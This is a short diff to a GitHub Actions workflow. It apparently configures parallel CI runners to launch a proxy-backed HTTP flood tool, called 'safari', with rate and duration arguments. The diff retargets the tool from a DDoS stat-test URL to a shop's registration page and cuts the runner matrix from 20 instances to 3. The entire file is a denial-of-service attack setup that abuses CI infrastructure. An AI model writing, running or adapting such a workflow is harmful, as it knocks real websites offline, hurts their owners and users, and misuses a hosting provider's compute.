@@ -13,7 +13,7 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19,20]
+        instance: [1, 2, 3]
     
     steps:
     - name: Checkout code
@@ -24,6 +24,6 @@ jobs:
         sudo apt-get update && sudo apt-get install -y dos2unix
         dos2unix safari proxies.txt
         chmod +x safari
-        ./safari https://c4.dstatbot.win/BUpBfsNX   700 10000 8000 proxies.txt --cdn --raw
+        ./safari https://xbossop.shop/register   700 10000 8000 proxy.txt --cdn --http
       continue-on-error: true
       
